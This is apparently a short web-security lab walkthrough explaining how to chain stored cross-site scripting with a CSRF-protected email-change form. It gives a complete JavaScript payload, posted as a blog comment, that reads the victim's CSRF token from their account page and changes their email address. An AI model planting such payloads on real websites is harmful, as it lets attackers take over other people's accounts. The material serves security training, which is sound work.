- Log in using the credentials provided. 
- On your user account page, notice the function for updating your email address.
- If you view the source for the page, you'll see the following information:
- You need to issue a POST request to /my-account/change-email, with a parameter called email.
- There's an anti-CSRF token in a hidden input called token.
- This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
- Submit the following payload in a blog comment:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

This will make anyone who views the comment issue a POST request to change their email address to test@test.com.
